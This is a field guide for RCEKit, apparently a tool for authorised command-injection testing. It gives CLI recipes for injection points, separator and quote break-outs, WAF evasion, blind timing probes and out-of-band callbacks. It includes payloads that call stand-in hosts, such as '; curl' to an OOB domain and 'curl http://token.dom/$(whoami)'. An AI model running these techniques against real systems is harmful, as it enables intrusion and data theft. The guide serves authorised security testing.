# RCEKit field guide

Every section below is a situation you actually hit on an engagement, with the
command that handles it and how to read what comes back. If you are looking for
the exhaustive list of flags instead, that lives in [reference.md](reference.md).

Everything here needs `--acknowledge-consent` — RCEKit actively sends payloads, so
only ever run it against systems you are authorised to test.

**Contents**

- [The five-minute workflow](#the-five-minute-workflow)
- [Point at a URL](#point-at-a-url)
- [Point at a captured request](#point-at-a-captured-request)
- [Landing the payload intact](#landing-the-payload-intact)
- [Choosing methods](#choosing-methods)
- [When the sink filters separators](#when-the-sink-filters-separators)
- [Injecting inside quotes](#injecting-inside-quotes)
- [Whole-command sinks](#whole-command-sinks)
- [Working around a WAF](#working-around-a-waf)
- [Blind targets](#blind-targets)
- [No-egress targets](#no-egress-targets)
- [Out-of-band callbacks](#out-of-band-callbacks)
- [Multi-step chains](#multi-step-chains)
- [Reading the results](#reading-the-results)
- [Keeping the run quiet](#keeping-the-run-quiet)
- [Troubleshooting](#troubleshooting)

---

## The five-minute workflow

Most engagements follow the same four steps. The rest of this guide is what to do
when one of them doesn't go to plan.

**1. Check the input even reaches a sink** — benign, no consent needed:

```bash
python rcekit.py --detection-only --output detect.txt
```

**2. Fire the two results-based methods.** They are cheap, safe, and between them
cover command injection and expression injection:

```bash
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/lookup?host=FUZZ" \
  --methods reflected,eval
```

**3. If that comes back `negative`, add timing** — the sink may execute with no
output channel:

```bash
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/lookup?host=FUZZ" \
  --methods reflected,eval,time --time-base 3
```

**4. Read the tier, not just the word.** `confirmed` goes in the report as proven
execution. `needs-review` goes in your notes for manual follow-up. See
[Reading the results](#reading-the-results).

---

## Point at a URL

Mark the injection point with `FUZZ` — in the URL, the `--verify-data` body, or a
`--verify-header`. The method defaults to `GET`, or `POST` when you pass
`--verify-data`.

```bash
# GET query parameter
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/lookup?host=FUZZ" --methods reflected
```

```bash
# Header injection — the payload stays single-line so the request stays valid
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/" \
  --verify-header "X-Forwarded-For: FUZZ" --methods reflected
```

Self-signed certificate on an internal box? Add `--insecure` (the same idea as
`curl -k`). Without it, a TLS failure is reported as `error`, not `negative` —
RCEKit will not let a connectivity problem read as "not vulnerable".

---

## Point at a captured request

Rebuilding a real request by hand is where mistakes creep in: a missing cookie, a
dropped CSRF token, the wrong `Content-Type`. Save the request from Burp or your
proxy and let RCEKit reuse its method, path, headers, body and cookies:

```bash
python rcekit.py --acknowledge-consent -r request.txt -p host --methods reflected
```

Two ways to mark the injection point:

- **Inline** — put `FUZZ` or `*` in the saved request where the payload goes.
- **By name** — `-p host` selects a parameter, searched in the order
  query → body → header → cookie. One injection point per run in this release.

**The scheme trap.** A portless capture cannot record whether it was HTTPS, so
RCEKit infers `https` when the `Host` is on `:443` and `http` otherwise — which
keeps lab and internal targets reachable. The inferred scheme is always printed,
and a capture carrying an `Authorization` or `Cookie` header over plain `http` is
flagged, because that would put credentials on the wire in cleartext. When the
flag fires, re-run with the scheme pinned:

```bash
python rcekit.py --acknowledge-consent -r request.txt -p host \
  --request-scheme https --methods reflected
```

`Host` and `Content-Length` are recomputed for you.

---

## Landing the payload intact

This is the single most common reason a real vulnerability comes back `negative`:
the payload arrives at the sink already mangled, so nothing executes.

RCEKit encodes each payload for **the exact injection point it lands in** — a
query value is percent-encoded, a JSON field is JSON-escaped, a form field is
form-encoded, a header stays single-line. So `; id` is delivered as a working
separator inside a JSON string, not as the literal `%3B%20id` that the sink never
decodes:

```bash
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/api" --verify-method POST \
  --verify-header "Content-Type: application/json" \
  --verify-data '{"host": "FUZZ"}' --methods reflected
```

The body location is auto-detected from the `Content-Type` and the shape of the
body. Override it when the guess is wrong:

| Flag | Use when |
|---|---|
| `--verify-body-location json_string` | JSON body — escapes for JSON, **no** percent-encoding |
| `--verify-body-location form_value` | `application/x-www-form-urlencoded` body |
| `--verify-body-location raw` | the payload must go on the wire verbatim |
| `--verify-url-location url_path` | `FUZZ` sits in the path, not a query value |
| `--verify-url-location raw` | no URL encoding at all |

If a run comes back `negative` but you can see your input echoed somewhere in the
response, encoding is the first thing to suspect.

---

## Choosing methods

`--methods` is additive — list everything you want to try, and each tier is
reported separately.

| You suspect | Use | Cost |
|---|---|---|
| Anything, first pass | `reflected,eval` | cheap, safe, no state change |
| A shell sink (`system()`, backticks, `exec`) | `reflected` | cheap |
| A template engine or expression language | `eval` | cheap |
| Execution with no output at all | `time` | slow — each probe waits on a real delay |
| No output, but you control a web root | `file` | writes files (see [No-egress targets](#no-egress-targets)) |

**Scope the environments to cut noise.** The shell methods (`reflected`, `file`,
`time`) apply to any environment whose runtime reaches a shell — the shell
environments themselves *plus* the language runtimes, because PHP's `system()`,
Python's `os.system()`, Node's `child_process.exec()`, Ruby's `system()`, Perl's
backticks and Go's `os/exec` all hand the string to `/bin/sh`:

```bash
# A PHP app — still probes for command injection, with fewer irrelevant variants
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/x?p=FUZZ" \
  --environments php --methods reflected,eval
```

A language runtime doesn't say which OS it runs on, so its probes take the Unix
shape; `--environments windows` remains the way to get `cmd.exe` probes. The
data-layer environments (`sql`, `graphql`, `mongodb`) are excluded from the shell
methods — reaching a shell from those needs a different escalation, so `eval` is
what applies there.

---

## When the sink filters separators

Stripping `;` is the most common partial mitigation there is, and it stops nothing
on its own — the same sink stays exploitable through a pipe, a chain operator or a
newline. So the shell probes sweep `; `, `| `, `|| `, `&& ` and a newline **by
default**, and a filter that drops any one of them is still reached.

Both chain operators are tried on purpose: the command your input lands in may
succeed or fail, and only one of `&&` / `||` fires either way.

Once you know the sink's shape, narrow the sweep to cut the request count:

```bash
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/ping?ip=FUZZ" --methods reflected \
  --separators '| ,&& '
```

Write a newline as `\n`. A single-separator run (`--separators '; '`) is the
quietest option when you already have a confirmed hit and just want to re-prove it
for the report.

---

## Injecting inside quotes

If the sink builds `ping '<input>'`, a leading `;` never fires — it is inside the
quoted string. Use the matching context, whose break-out closes the quote and
supplies its own separator:

```bash
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/ping?ip=FUZZ" --methods reflected \
  --contexts shell_single_quoted
```

Use `shell_double_quoted` for `ping "<input>"`. If you don't know which, pass both
— they are cheap and mutually exclusive in practice.

---

## Whole-command sinks

By default the shell probes assume there is a surrounding command to break out of
(`system("ping " + input)`), so they lead with a separator. Some sinks instead run
your input as the **entire** command — a `qx/$input/` backdoor, a bare
`sh -c "$input"` — where there is nothing to break out of and a leading `;` is a
shell syntax error that guarantees a false `negative`.

```bash
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/run?cmd=FUZZ" --methods reflected --sink-raw
```

`--sink-raw` sends the probes as bare commands and ignores `--separators`.

---

## Working around a WAF

The default sends **clean, canonical** payloads: fewest variants, clearest
confirmation, lowest false positives — on the assumption of authorised, WAF-free
access. That default is a feature; noisy evasion buys blocked requests and muddy
evidence.

When there is genuinely a WAF in the path, `--evade low` opts into a single
low-touch transform (`${IFS}` for spaces on Unix) for the shell probes:

```bash
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/ping?ip=FUZZ" --methods reflected --evade low
```

It is deliberately minimal. If `low` isn't enough, the answer is usually a better
injection context or a different separator, not heavier obfuscation.

---

## Blind targets

No output channel at all? Timing is the fallback. RCEKit fires a controlled
`0/N/2N` delay series and requires the response time to track it **linearly** — a
one-off slow response (jitter, GC pause, noisy neighbour) fails the regression.

```bash
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/ping?ip=FUZZ" \
  --methods reflected,time --time-base 3
```

Two things worth internalising:

- **Timing never self-confirms.** There is no computed value to check, so a
  positive timing result is reported `needs-review`, always. That is not RCEKit
  hedging — it is the honest ceiling of the evidence.
- **Always pair it with a results-based method.** Listing `reflected` alongside
  `time` costs almost nothing and, if any output channel exists at all, upgrades
  the finding from `needs-review` to `confirmed`.

Raise `--time-base` on a slow or noisy target; the regression gets easier to
separate from background variance as `N` grows, at the cost of a slower run.

---

## No-egress targets

Internal target, no outbound connectivity, no output in the response — but you
know a directory the web server writes and serves. Prove execution by writing a
random token and fetching it back:

```bash
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/ping?ip=FUZZ" \
  --methods file --webroot /var/www/html --web-base-url https://target.example
```

This confirms execution **plus** a write primitive, with no external listener
anywhere in the picture.

**It changes target state.** One file per confirmed probe, which is why the method
is gated behind both `--webroot` and `--web-base-url`. RCEKit prints an exact
`rm`/`del` **cleanup command** for every finding — run it before you leave, and
paste it into the report so the client can verify the target was left clean.

A stale file can't produce a false positive: both the filename and the token are
freshly random each run.

---

## Out-of-band callbacks

For blind classes that reach out — Log4Shell/JNDI, DNS exfil, async jobs — RCEKit
ships its own HTTP/DNS listener, so you don't need interactsh or Collaborator.

Generate OOB payloads with a domain you control, then listen and correlate:

```bash
python rcekit.py --acknowledge-consent --categories oob \
  --oob-domain your-id.oob.example.com --output oob.txt

python rcekit.py --listen --correlate oob.txt.map.jsonl \
  --listen-http-port 8080 --listen-dns-port 53
```

```
[HIT] http token=8k2hn1ufohpv from 10.0.0.5 -> ; curl http://8k2hn1ufohpv.oob.example.com/ [oob/raw]
```

Each payload carries a unique token, recorded in a `.map.jsonl` manifest, so every
callback maps back to the exact payload that caused it. Correlation matches the
token in the callback **host or path**, so exfil shaped like
`curl http://token.dom/$(whoami)` still resolves.

For a real engagement, point the OOB domain's NS/A records at the listener; port
53 needs root. In a lab, skip the DNS delegation and aim payloads straight at the
listener's address.

---

## Multi-step chains

A single request cannot reach a sink that sits behind a login, arrives inside
**uploaded file content**, or executes **blind/async** minutes later.
`--verify-chain` drives an ordered, cookie-aware flow — login → CSRF extraction →
prerequisites → payload delivery → trigger — and confirms either **in-band** (a
`match` oracle on a chosen step) or **out-of-band** (a `{callback}` URL received by
the built-in listener).

```json
{
  "base": "https://target.example",
  "callback_host": "10.0.0.5", "listen_port": 8877, "confirm_step": "trigger",
  "steps": [
    {"name": "csrf",   "method": "GET",  "path": "/login", "extract": {"csrf": "csrf_token\" value=\"([^\"]+)"}},
    {"name": "login",  "method": "POST", "path": "/login", "form": {"csrf": "{csrf}", "user": "u", "pass": "p"}},
    {"name": "upload", "method": "POST", "path": "/import", "multipart": {"file": {"field": "f", "filename": "x_{token}.sql", "content": "FUZZ"}}},
    {"name": "trigger","method": "POST", "path": "/import/run", "json": "{\"file\": \"x_{token}.sql\"}"}
  ]
}
```

```bash
python rcekit.py --acknowledge-consent --environments postgres --categories code_execution \
  --contexts raw --encodings none --verify-active-risk intrusive --verify-chain chain.json
```

Each step is a `method` + `path` (+ optional `headers`) with exactly one body of
`body` (raw), `json`, `form`, or `multipart`. Three substitutions do the work:

| Marker | Meaning |
|---|---|
| `FUZZ` | where the payload goes — including inside uploaded file content |
| `{var}` | a value captured by an earlier step's `extract` regex |
| `{token}` | a per-payload unique value, for correlating the trigger back to the delivery |

---

## Reading the results

| Verdict | What it means | What to do |
|---|---|---|
| **`confirmed`** | Execution proven. The evidence line shows the exact value the target computed. | Put it in the report. |
| **`needs-review`** | A real candidate — e.g. a linear timing response — but not proof on its own. | Manual follow-up. Never report as proven. |
| **`negative`** | Reached the target, found no evidence. | Suspect [encoding](#landing-the-payload-intact) or [sink shape](#whole-command-sinks) before concluding it's safe. |
| **`inconclusive`** | Evidence appeared, but also appears *without* the payload — so it isn't attributable to execution. | Not a finding. This is the false positive that never made it out. |
| **`error`** | The request never reached the target — a delivery or TLS failure. | Fix connectivity, then re-run. For a self-signed cert, add `--insecure`. |

`error` is kept separate from `negative` on purpose: a connectivity problem must
never read as "not vulnerable".

<details>
<summary><b>Why a <code>confirmed</code> can't be a false positive</b></summary>

<br>

Every confirmation is **differential** and built on a value RCEKit picked at
random, so reflection or coincidence can't produce it:

- **Results-based (`reflected` / `eval`)** — the expected value is a tag-wrapped
  sum or a boundary-fenced product of random operands. A target that merely echoes
  the payload returns the literal `$((a+b))` / `a*b`, never the computed value.
  The value is also checked against a payload-free control, and the search is
  encoding-aware (a base64/hex/url/html-encoded output still confirms).
- **Timing (`time`)** — a controlled `0/N/2N` series must produce a *linear*
  response-time increase; a one-off slow response fails the regression. Timing has
  no computed value, so it never self-confirms.
- **File (`file`)** — the fetched file must contain the random token; a stale file
  can't match, because the filename and token are fresh each run.

</details>

---

## Keeping the run quiet

Verification is active traffic. When the engagement calls for restraint:

```bash
python rcekit.py --acknowledge-consent \
  --verify-url "https://target.example/ping?ip=FUZZ" --methods reflected \
  --separators '; ' --contexts raw --environments unix \
  --verify-delay 2 --max-payloads 20
```

- `--verify-delay` — seconds between requests, for rate limits and for staying
  under detection thresholds.
- `--separators` / `--contexts` / `--environments` — every narrowing cuts probes.
- `--max-payloads` — a hard cap, sampled round-robin so the remaining probes stay
  balanced across variants rather than all coming from one bucket.
- `--verify-timeout` — lower it on a fast target so dead probes fail quickly.

Note that `--max-payloads` caps *generation*, so combine it with the narrowing
flags rather than relying on it alone to pick the interesting probes.

---

## Troubleshooting

**"Payload corpus is not usable" / RCEKit refuses to start.** The payload corpus
(`templates/payloads.json`) is missing or unparseable. RCEKit exits non-zero
rather than silently testing nothing:

```bash
python rcekit.py --doctor
```

Run it from the repository root, or point `--template-file` at a valid corpus.
Note that YAML templates are not supported — the corpus is JSON.

**A run reports that it built no probes, and exits non-zero.** Your filters
excluded everything — commonly `--environments sql` with a shell method, or a
`--deny-chars` set that removed every candidate. A run that tested nothing is
never reported as a clean result, which is why this is an error rather than a
`negative`.

**Everything comes back `error`.** The requests aren't reaching the target. Check
the printed scheme if you used `-r` (see
[Point at a captured request](#point-at-a-captured-request)), add `--insecure` for
a self-signed certificate, and confirm the host is reachable at all.

**A known-vulnerable target comes back `negative`.** In rough order of likelihood:
[payload encoding](#landing-the-payload-intact), a
[whole-command sink](#whole-command-sinks) needing `--sink-raw`, a
[quoted context](#injecting-inside-quotes), a
[filtered separator](#when-the-sink-filters-separators), or a blind sink that
needs [`time`](#blind-targets) or [`file`](#no-egress-targets).

**Where the logs go.** Execution logs land in `rcekit.log`; every
exploitation/verification run is additionally recorded in `exploit_audit.log`.
Both are worth attaching to an engagement's evidence bundle.
